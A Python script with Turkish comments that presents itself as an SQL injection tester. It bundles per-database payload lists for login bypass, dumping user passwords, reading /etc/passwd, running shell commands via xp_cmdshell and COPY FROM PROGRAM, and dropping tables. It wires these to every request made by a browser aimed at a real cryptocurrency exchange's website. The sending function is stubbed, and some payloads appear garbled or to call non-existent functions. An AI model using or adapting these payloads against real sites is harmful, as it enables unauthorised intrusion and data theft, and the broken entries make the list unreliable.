# Zehra Kolsuz @zehrakolsuz


from playwright.sync_api import sync_playwright
from urllib.parse import urlparse, parse_qs
import time
import json
import signal
import sys
import subprocess
import os
import random
import re
import threading
import queue

# Gelişmiş SQL Enjeksiyon Payload Üreticisi
class SQLInjectionPayloadGenerator:
    def __init__(self):
        self.payloads = self._get_payloads()
        self.db_detection_payloads = {
            "mysql": "' AND 1=CONVERT(int, @@version)--",
            "mssql": "' AND 1=CONVERT(int, @@version)--",
            "oracle": "' AND 1=UTL_INADDR.get_host_name('localhost')--",
            "postgresql": "' AND 1=pg_sleep(1)--",
            "sqlite": "' AND sqlite_version() IS NOT NULL--",
            "mariadb": "' AND SLEEP(1)--",
            "db2": "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH('test')--",
            "hana": "' AND SQL_INJECTION_TEST('test') IS NOT NULL--",
            "firebird": "' AND SUBSTRING(RDB$GET_CONTEXT('SYSTEM','ENGINE_VERSION'),1,1) = '2'--"
        }

    def _get_payloads(self):
        """Sabit payload'ları döndürür (sql_payloads.json içeriği doğrudan entegre edildi)."""
        return {
            "general": [
                "' OR '1'='1",
                "' OR 1=1--",
                "1' ORDER BY 1--+",
                "' OR 'a'='a",
                "') OR ('1'='1",
                "'/**/OR/**/1=1--",
                "1 AND 1=1",
                "1 OR 1=1",
                "' OR ''='",
                "' OR 2>1",
                "admin' --",
                "admin' #",
                "' OR 1=1/*",
                "') OR ('a'='a",
                "' OR 'x'='x",
                "1' OR '1'='1",
                "1' OR 1=1#",
                "1' OR '1'='1' --",
                "' OR 1=1 LIMIT 1 --",
                "' HAVING 1=1 --",
                "' OR '1'='1' #",
                "1 OR 2=2",
                "1 AND 2=2",
                "' OR 3=3 --",
                "' OR '1'='1' /*"
            ],
            "mysql": [
                "UNION SELECT 1,2,3 --",
                "ORDER BY 1 --",
                "' AND 1=0 UNION SELECT NULL, NULL, NULL --",
                "' UNION ALL SELECT 1, @@version;#",
                "' AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)--",
                "' AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--",
                "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--",
                "' AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",
                "' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
                "' UNION SELECT 1, LOAD_FILE('/etc/passwd') --",
                "' INTO OUTFILE '/tmp/testfile'",
                "' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/testfile'",
                "' AND SLEEP(5)",
                "' AND BENCHMARK(1000000,MD5('test'))",
                "' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema=database()",
                "' UNION SELECT table_name FROM information_schema.tables",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'",
                "' UNION SELECT username, password FROM users",
                "' OR 1=1 LIMIT 1 --",
                "' HAVING 1=1 --"
            ],
            "mssql": [
                ";waitfor delay '0:0:10'--",
                "AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -",
                "SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'",
                "EXEC xp_cmdshell 'net user';",
                "SELECT * FROM OPENROWSET(BULK 'C:\\test.txt', SINGLE_CLOB)",
                "' UNION ALL SELECT NULL, NULL, NULL --",
                "' ORDER BY 1 --",
                "' AND 1=CAST((SELECT @@version) AS INT)",
                "' AND (SELECT SUBSTRING((SELECT @@version),1,1)) = 'M'",
                "' AND ASCII(SUBSTRING((SELECT @@version),1,1)) > 64",
                "' UNION SELECT 1,2,3 FROM sysobjects WHERE xtype='U'",
                "' UNION SELECT name FROM sys.databases",
                "' UNION SELECT table_name FROM information_schema.tables",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'",
                "' UNION SELECT username, password FROM users",
                "' OR 1=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                "' OR 1=1; EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';",
                "' AND (SELECT COUNT(*) FROM sysusers) > 0",
                "' AND USER_NAME() = 'dbo'",
                ";waitfor delay '0:0:5'--"
            ],
            "oracle": [
                "' OR '1'='1",
                "UNION SELECT NULL FROM DUAL --",
                "ORDER BY 1 --",
                "' AND 1=UTL_INADDR.get_host_name('localhost') --",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('pipe',10) --",
                "' UNION SELECT banner FROM v$version",
                "' UNION SELECT table_name FROM all_tables",
                "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'",
                "' UNION SELECT username, password FROM users",
                "' AND EXISTS (SELECT * FROM dual WHERE 1=1)",
                "' AND (SELECT COUNT(*) FROM all_users) > 0",
                "' AND USER = 'SYS'",
                "' OR 1=1 --",
                "' OR 1=1#",
                "' OR 1=1/*",
                "') OR ('1'='1",
                "' AND rownum <= 1",
                "' HAVING 1=1",
                "' UNION SELECT NULL, NULL FROM DUAL --",
                "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH('test') --"
            ],
            "postgresql": [
                "' OR '1'='1",
                "; DROP TABLE users --",
                "' UNION SELECT 1,2,3 --",
                "' ORDER BY 1 --",
                "' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1 OFFSET 0)",
                "' AND substring(version(),1,1) = '8'",
                "' AND 1=pg_sleep(5)",
                "' UNION SELECT table_name FROM information_schema.tables",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'",
                "' UNION SELECT username, password FROM users",
                "' OR 1=1 LIMIT 1 OFFSET 0",
                "' HAVING 1=1",
                "' AND (SELECT COUNT(*) FROM pg_user) > 0",
                "' AND current_user = 'postgres'",
                "' OR 1=1; VACUUM",
                "' OR 1=1; ANALYZE",
                "' AND (SELECT version()) LIKE '%PostgreSQL%'",
                "' AND (SELECT pg_read_file('/etc/passwd')) IS NOT NULL",
                "' OR 1=1; CREATE TABLE cmd_exec(cmd_output text)",
                "' OR 1=1; COPY cmd_exec FROM PROGRAM 'id'"
            ],
            "sqlite": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3 --",
                "' ORDER BY 1 --",
                "' AND sqlite_version() LIKE '%3%'",
                "' AND 1=(SELECT LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000/2)))))",
                "' UNION SELECT name FROM sqlite_master WHERE type='table'",
                "' UNION SELECT sql FROM sqlite_master",
                "' AND (SELECT COUNT(*) FROM sqlite_master) > 0",
                "' OR 1=1 --",
                "' AND randomblob(1000000) IS NOT NULL",
                "' UNION SELECT 1, sqlite_version(), 3 --",
                "' AND substr(sqlite_version(),1,1) = '3'",
                "' OR 'a'='a' --",
                "' AND (SELECT name FROM sqlite_master LIMIT 1) IS NOT NULL",
                "' OR 1=1 ORDER BY 1 --",
                "' AND length(sqlite_version()) > 0"
            ],
            "mariadb": [
                "' OR '1'='1",
                "UNION SELECT 1,2,3 --",
                "' AND SLEEP(5)",
                "' UNION ALL SELECT 1, @@version --",
                "' AND BENCHMARK(1000000,MD5('test'))",
                "' UNION SELECT table_name FROM information_schema.tables",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'",
                "' AND IF(1=1,SLEEP(5),0)",
                "' ORDER BY 1 --",
                "' AND SUBSTRING(@@version,1,1) = '1'",
                "' UNION SELECT 1, LOAD_FILE('/etc/passwd') --",
                "' INTO OUTFILE '/tmp/mariadb_test'",
                "' OR 1=1 LIMIT 1 --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0",
                "' UNION SELECT 1,2, database() --"
            ],
            "db2": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3 FROM syscat.tables --",
                "' ORDER BY 1 --",
                "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH('test') --",
                "' AND SUBSTR(DBMS_UTILITY.VERSION,1,1) = '1'",
                "' UNION SELECT tabname FROM syscat.tables",
                "' UNION SELECT colname FROM syscat.columns WHERE tabname='USERS'",
                "' AND (SELECT COUNT(*) FROM syscat.tables) > 0",
                "' OR 1=1 --",
                "' AND CURRENT SERVER = 'DB2INST1'",
                "' UNION SELECT 1, CURRENT SERVER, 3 --",
                "' AND 1=DB2_SECURITY.LABEL_TO_CHAR('label',1) --",
                "' OR 'a'='a' --",
                "' AND LENGTH(DBMS_UTILITY.VERSION) > 0",
                "' OR 1=1 ORDER BY 1 --"
            ],
            "hana": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3 FROM SYS.TABLES --",
                "' ORDER BY 1 --",
                "' AND SQL_INJECTION_TEST('test') IS NOT NULL",
                "' UNION SELECT table_name FROM SYS.TABLES",
                "' UNION SELECT column_name FROM SYS.TABLE_COLUMNS WHERE table_name='USERS'",
                "' AND CURRENT_USER = 'SYSTEM'",
                "' OR 1=1 --",
                "' AND (SELECT COUNT(*) FROM SYS.TABLES) > 0",
                "' UNION SELECT 1, CURRENT_SCHEMA, 3 --",
                "' AND SUBSTRING(CURRENT_SCHEMA,1,1) = 'S'",
                "' OR 'a'='a' --",
                "' AND LENGTH(CURRENT_SCHEMA) > 0",
                "' OR 1=1 LIMIT 1 --",
                "' AND IFNOWAIT(1=1, SLEEP(5), 0)"
            ],
            "firebird": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3 FROM RDB$DATABASE --",
                "' ORDER BY 1 --",
                "' AND SUBSTRING(RDB$GET_CONTEXT('SYSTEM','ENGINE_VERSION'),1,1) = '2'",
                "' UNION SELECT RDB$RELATION_NAME FROM RDB$RELATIONS",
                "' UNION SELECT RDB$FIELD_NAME FROM RDB$FIELDS",
                "' AND (SELECT COUNT(*) FROM RDB$DATABASE) > 0",
                "' OR 1=1 --",
                "' AND RDB$GET_CONTEXT('SYSTEM','ENGINE_VERSION') LIKE '%2%'",
                "' UNION SELECT 1, RDB$GET_CONTEXT('SYSTEM','ENGINE_VERSION'), 3 --",
                "' OR 'a'='a' --",
                "' AND LENGTH(RDB$GET_CONTEXT('SYSTEM','ENGINE_VERSION')) > 0",
                "' OR 1=1 ORDER BY 1 --",
                "' AND FIRST 1 SKIP 0 1=1 --",
                "' AND SUBSTRING(CURRENT_USER,1,1) = 'S'"
            ]
        }

    def generate_payloads(self, db_type=None):
        """Belirli bir veritabanı türüne göre veya genel payload'ları döndürür."""
        if db_type and db_type in self.payloads:
            return self.payloads[db_type]
        return self.payloads["general"]

    def detect_db_type(self, url, method, params):
        """Hedef veritabanını tespit eder."""
        for db, payload in self.db_detection_payloads.items():
            test_params = params.copy()
            test_params[list(params.keys())[0]] += payload
            response = self._simulate_request(url, method, test_params)
            if self._check_db_response(response, db):
                return db
        return "general"

    def _check_db_response(self, response, db):
        """Veritabanına özgü hata mesajlarını kontrol eder."""
        markers = {
            "mysql": ["MySQL", "MariaDB"],
            "mssql": ["Microsoft SQL Server", "OLE DB"],
            "oracle": ["ORA-", "Oracle error"],
            "postgresql": ["PostgreSQL", "PGSQL"],
            "sqlite": ["SQLite", "SQLITE"],
            "mariadb": ["MariaDB"],
            "db2": ["DB2", "SQLSTATE"],
            "hana": ["SAP HANA", "HANA"],
            "firebird": ["Firebird", "ISC ERROR"]
        }
        for marker in markers.get(db, []):
            if marker.lower() in response.lower():
                return True
        return False

    def _simulate_request(self, url, method, params):
        """Simüle edilmiş bir istek döndürür."""
        return ""  # Gerçek uygulamada HTTP kütüphanesi kullanılmalı

# Gelişmiş SQL Enjeksiyon Test Aracı
class AdvancedSQLInjectionTester:
    def __init__(self, output_dir="sqlmap_results"):
        self.output_dir = output_dir
        self.payload_generator = SQLInjectionPayloadGenerator()
        self.vulnerable_endpoints = []
        self.payload_cache = {}

    def inject_payloads(self, request_data):
        """Parametrelere payload enjeksiyonu yapar ve güvenlik açıklarını test eder."""
        parameters = self._extract_parameters(request_data)
        if not parameters:
            return []

        # Veritabanı türünü tespit et
        db_type = self.payload_generator.detect_db_type(request_data['url'], request_data['method'], parameters)
        print(f"Tespit edilen veritabanı: {db_type}")

        payloads = self.payload_generator.generate_payloads(db_type)
        detected_vulnerabilities = []

        # Payload'ları paralel test et
        thread_pool = []
        result_queue = queue.Queue()

        for param_name, original_value in parameters.items():
            for payload in payloads:
                test_params = parameters.copy()
                test_params[param_name] = f"{original_value}{payload}"
                thread = threading.Thread(target=self._test_injection_thread,
                                         args=(request_data['url'], request_data['method'], test_params, param_name, payload, result_queue))
                thread_pool.append(thread)
                thread.start()

        for thread in thread_pool:
            thread.join()

        while not result_queue.empty():
            vulnerability = result_queue.get()
            if vulnerability:
                detected_vulnerabilities.append(vulnerability)

        return detected_vulnerabilities

    def _test_injection_thread(self, url, method, params, param_name, payload, result_queue):
        """Enjeksiyon testi yapar ve sonucu kuyruğa ekler."""
        vulnerability = self._test_injection(url, method, params, param_name, payload)
        result_queue.put(vulnerability)

    def _extract_parameters(self, request_data):
        """URL ve POST verilerinden parametreleri çıkarır."""
        parameters = {}
        parsed_url = urlparse(request_data['url'])

        if 'postData' in request_data:
            try:
                post_data = json.loads(request_data['postData'])
                if isinstance(post_data, dict):
                    parameters.update(post_data)
            except (json.JSONDecodeError, TypeError):
                try:
                    parameters.update(dict(parse_qs(request_data['postData'])))
                except:
                    pass

        return parameters

    def _test_injection(self, url, method, params, original_param_name=None, payload=None):
        """Enjeksiyon testi yapar ve güvenlik açığı bulursa detay döndürür."""
        injection_markers = [
            "SQL syntax error",
            "ORA-",
            "PostgreSQL",
            "Microsoft OLE DB Provider for SQL Server",
            "SQLite",
            "DB2",
            "HANA",
            "Firebird"
        ]

        try:
            response = self._simulate_request(url, method, params)
            for marker in injection_markers:
                if marker.lower() in response.lower():
                    return {
                        'url': url,
                        'method': method,
                        'parameter': original_param_name,
                        'payload': payload,
                        'risk_level': 'HIGH',
                        'detection_method': 'Error-based heuristics'
                    }
        except Exception as e:
            print(f"Enjeksiyon testi sırasında hata: {e}")

        return None

    def _simulate_request(self, url, method, params):
        """Simüle edilmiş bir istek döndürür."""
        return ""  # Gerçek uygulamada requests veya httpx kullanılabilir

def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()

        sql_tester = AdvancedSQLInjectionTester()

        def handle_request(request):
            request_data = {
                'url': request.url,
                'method': request.method,
                'headers': dict(request.headers)
            }
            try:
                post_data = request.post_data
                if post_data:
                    request_data['postData'] = post_data
            except:
                pass

            vulnerabilities = sql_tester.inject_payloads(request_data)
            if vulnerabilities:
                print("\n[!] POTANSİYEL SQL ENJEKSİYON AÇIKLARI TESPİT EDİLDİ:")
                for vuln in vulnerabilities:
                    print(json.dumps(vuln, indent=2))

        page.on("request", handle_request)
        page.goto("https://www.binance.com/en")
        page.wait_for_timeout(60000)
        browser.close()

if __name__ == "__main__":
    print("UYARI: Bu kod yalnızca eğitim ve yasal test amaçlı kullanılmalıdır :D !")
    main()
